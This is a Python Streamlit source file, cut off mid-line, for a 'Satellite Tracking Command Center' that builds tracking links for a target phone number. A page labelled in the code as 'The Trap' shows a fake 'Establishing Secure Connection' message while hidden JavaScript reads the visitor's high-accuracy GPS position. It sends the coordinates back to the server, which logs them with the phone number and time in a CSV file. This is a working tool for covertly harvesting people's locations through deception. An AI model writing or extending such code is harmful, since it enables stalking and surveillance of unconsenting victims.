import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
import os
from datetime import datetime
import phonenumbers
from phonenumbers import geocoder, carrier
import streamlit.components.v1 as components

# --- 1. CONFIG & DATABASE ---
st.set_page_config(page_title="Luca's Satellite Tracker", layout="wide", page_icon="📡")
LOG_FILE = "location_history.csv"

def save_location(lat, lon, phone):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_data = pd.DataFrame([[timestamp, phone, lat, lon]], 
                            columns=["Time", "Phone", "Lat", "Lon"])
    if not os.path.isfile(LOG_FILE):
        new_data.to_csv(LOG_FILE, index=False)
    else:
        new_data.to_csv(LOG_FILE, mode='a', header=False, index=False)

# --- 2. QUERY PARAMETER LOGIC (The "Trap") ---
query_params = st.query_params

# If the URL has ?mode=track, show the hidden tracking script
if "mode" in query_params and query_params["mode"] == "track":
    target_phone = query_params.get("phone", "Unknown")
    st.write(f"### ⚡ Establishing Secure Connection for {target_phone}...")
    components.html(f"""
        <script>
        navigator.geolocation.getCurrentPosition(function(pos) {{
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            // Redirect back to main map with data
            window.parent.location.href = "?phone={target_phone}&lat=" + lat + "&lon=" + lon;
        }}, function(err) {{
            document.body.innerHTML = "❌ Connection Failed: Please enable GPS and Refresh.";
        }}, {{enableHighAccuracy: true}});
        </script>
    """, height=200)
    st.stop()

# If the URL has ?lat= and ?lon=, it means a phone just reported its location
if "lat" in query_params and "lon" in query_params:
    save_location(float(query_params["lat"]), float(query_params["lon"]), query_params.get("phone", "Unknown"))
    # Clear the URL so it doesn't double-save on refresh
    st.query_params.clear()
    st.rerun()

# --- 3. MAIN INTERFACE ---
st.title("📡 Satellite Tracking Command Center")

with st.sidebar:
    st.header("🔍 New Target Lookup")
    number_input = st.text_input("Enter Number (+356...)", placeholder="+356")
    if number_input:
        try:
            parsed = phonenumbers.parse(number_input)
            st.success(f"📍 {geocoder.description_for_number(parsed, 'en')}")
            st.info(f"📶 {carrier.name_for_number(parsed, 'en')}")
            st.write("---")
            st.subheader("🔗 Tracking Link")
            # Generate the link to send to the target
            base_url = 
